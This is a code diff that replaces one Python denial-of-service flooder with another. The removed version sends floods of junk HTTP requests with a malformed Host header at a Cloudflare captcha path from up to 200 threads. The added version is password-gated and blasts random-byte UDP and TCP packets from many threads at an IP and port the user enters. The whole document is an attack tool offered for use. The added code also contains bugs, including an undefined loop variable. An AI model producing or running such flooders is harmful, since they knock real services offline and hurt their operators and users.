@@ -1,46 +1,86 @@
-import threading, sys, os, time, requests, json
-from random import choice, randint
-from utils import *
+import random
+import socket
+import os
+import threading
+import sys
+import time
 
-from requests.packages.urllib3.exceptions import InsecureRequestWarning
-requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+os.system("clear")
+password =input("[•] Password ---> ")
+time.sleep(5)
+                                
+if password=="King":
+	print("[•] Correct...")
+	time.sleep(5)
+else:
+		print("\033[91m[×] Wrong Password!!!")
+		time.sleep(9999999999)
+os.system("clear")
 
-def flood():
+print("""\033[35m	
+   ____  ____       ____       _   _   _             _  	
+  |  _ \|  _ \  ___/ ___|     / \ | |_| |_ __ _  ___| | __
+  | | | | | | |/ _ \___ \    / _ \| __| __/ _` |/ __| |/ /
+  | |_| | |_| | (_) |__) |  / ___ \ |_| || (_| | (__|   < 
+  |____/|____/ \___/____/  /_/   \_\__|\__\__,_|\___|_|\_\ © """)
+print()
 
-    url = sys.argv[2]
-    port = int(sys.argv[3])
-    duration = int(sys.argv[4])
+choice =str(input("\033[32m >>> \033[31m KingBob Is Handsome? (y): => "))
+ip =str(input("\033[32m >>> \033[31m IP TARGET : => "))
+port =int(input("\033[32m >>> \033[31m PORT TARGET : => "))
+time =int(input("\033[32m >>> \033[31m PACKETS : => "))
+threads =int(input("\033[32m >>> \033[31m THREADS : => "))
 
-    time.sleep(5)
+def ddos():
+	data = random._urandom(577)
+	i = random.choice(("[-]","[•]","[+]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			for x in range(times):
+				s.sendto(data,addr)
+			print(i +"\u001b[32m Send Attack To \033[36m >>> \033[31m{}:{} \u001b[36m".format(ip, port))
+		except:
+			print("\033[91m[•]\u001b[32m Send Attack To \033[36m >>> \033[31m{}:{} \u001b[36m".format(ip, port))
 
-    stoptime = time.time() + duration
-    session = createsession()
-    while time.time() < stoptime:
-        try:
-            headers = buildheaders(url)
-            kek = r'\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA'
-            session.get(f'{"https" if port == 443 else "http"}://{url}:{str(port)}/{kek}', headers=headers, verify=False, timeout=(5, 2), allow_redirects=False, stream=False)
-            headers['host'] = kek
-            session.get(f'{"https" if port == 443 else "http"}://{url}:{str(port)}/cdn-cgi/l/chk_captcha', headers=headers, verify=False, timeout=(5, 2), allow_redirects=False, stream=False)
-        except Exception:
-            pass
 
-if __name__ == '__main__':
-    print('''
-             /$$                 /$$           /$$   /$$ /$$$$$$$$ /$$$$$$$$ /$$$$$$$          /$$$$$$  /$$$$$$$$ /$$$$$$  /$$      /$$ /$$$$$$$ 
-            | $$                | $$          | $$  | $$|__  $$__/|__  $$__/| $$__  $$        /$$__  $$|__  $$__//$$__  $$| $$$    /$$$| $$__  $$
-            | $$       /$$   /$$| $$ /$$$$$$$$| $$  | $$   | $$      | $$   | $$  \ $$       | $$  \__/   | $$  | $$  \ $$| $$$$  /$$$$| $$  \ $$
-            | $$      | $$  | $$| $$|____ /$$/| $$$$$$$$   | $$      | $$   | $$$$$$$//$$$$$$|  $$$$$$    | $$  | $$  | $$| $$ $$/$$ $$| $$$$$$$/
-            | $$      | $$  | $$| $$   /$$$$/ | $$__  $$   | $$      | $$   | $$____/|______/ \____  $$   | $$  | $$  | $$| $$  $$$| $$| $$____/ 
-            | $$      | $$  | $$| $$  /$$__/  | $$  | $$   | $$      | $$   | $$              /$$  \ $$   | $$  | $$  | $$| $$\  $ | $$| $$      
-            | $$$$$$$$|  $$$$$$/| $$ /$$$$$$$$| $$  | $$   | $$      | $$   | $$             |  $$$$$$/   | $$  |  $$$$$$/| $$ \/  | $$| $$      
-            |________/ \______/ |__/|________/|__/  |__/   |__/      |__/   |__/              \______/    |__/   \______/ |__/     |__/|__/
-    ''')
+def ddos2():
+	data = random._urandom(17)
+	i = random.choice(("[-]","[•]","[!]","[+]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			s.connect((ip,port))
+			s.send(data)
+			for x in range(times):
+				s.send(data)
+			print(i +"\u001b[32m Send Attack To \033[36m >>> \033[31m{}:{} \u001b[36m".format(ip, port))
+		except:
+			s.close()
+			print("\033[91m[•]\u001b[32m Send Attack To \033[36m >>> \033[31m{}:{} \u001b[36m".format(ip, port))
 
-    try:
-        threadcount = 200 if int(sys.argv[1]) > 200 else int(sys.argv[1])
-
-        for _ in range(threadcount):
-            threading.Thread(target=flood).start()
-    except:
-        print('error')
+def ddos3():
+	data = random._urandom(1025)
+	i = random.choice(("[-]","[•]","[+]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			s.connect((ip,port))
+			s.send(data)
+			for x in range(times):
+				s.send(data)
+			print(i +"\u001b[32m Send Attack To \033[36m >>> \033[31m{}:{} \u001b[36m".format(ip, port))
+		except:
+			s.close()
+			print("\033[91m[•]\u001b[32m Send Attack To \033[36m >>> \033[31m{}:{} \u001b[36m".format(ip, port))
+				
+for y in range(threads):
+	if choice == 'y':
+		th = threading.Thread(target = ddos)
+		th.start()
+		th = threading.Thread(target = ddos2)
+		th.start()
+	else:
+	    th = threading.Thread(target = ddos3)
+	    th.start()
